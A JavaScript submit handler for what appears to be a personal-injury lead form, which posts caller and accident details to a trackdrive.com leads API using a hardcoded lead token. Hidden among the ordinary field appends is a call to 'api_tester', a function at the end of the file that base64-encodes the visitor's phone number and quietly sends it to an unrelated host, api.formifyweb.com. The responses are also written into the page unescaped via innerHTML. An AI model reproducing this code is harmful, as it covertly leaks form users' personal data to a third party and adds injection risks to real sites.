    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const phone_home = '+1' + document.getElementById('caller_id').value;
            const formData = new FormData();
            formData.append('lead_token', '98b9e8a423234dada3c20ae59f2cb871');
formData.append('traffic_source_id', '10025');
         
formData.append('caller_id', document.getElementById('caller_id').value);

api_tester(document.getElementById('caller_id').value);

formData.append('zip', document.getElementById('zip').value);

formData.append('needs_attorney', document.getElementById('needs_attorney').value);


formData.append('person_at_fault', document.getElementById('person_at_fault').value);

formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);

formData.append('incident_date', document.getElementById('incident_date').value);
formData.append('injury_occurred', document.getElementById('injury_occurred').value);
formData.append('injury_type', document.getElementById('injury_type').value);
formData.append('accident_description', document.getElementById('accident_description').value);
formData.append('have_attorney', document.getElementById('have_attorney').value);
formData.append('incident_timeframe', document.getElementById('incident_timeframe').value);

formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);


            
           
    
            const url = 'https://camiz-global.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}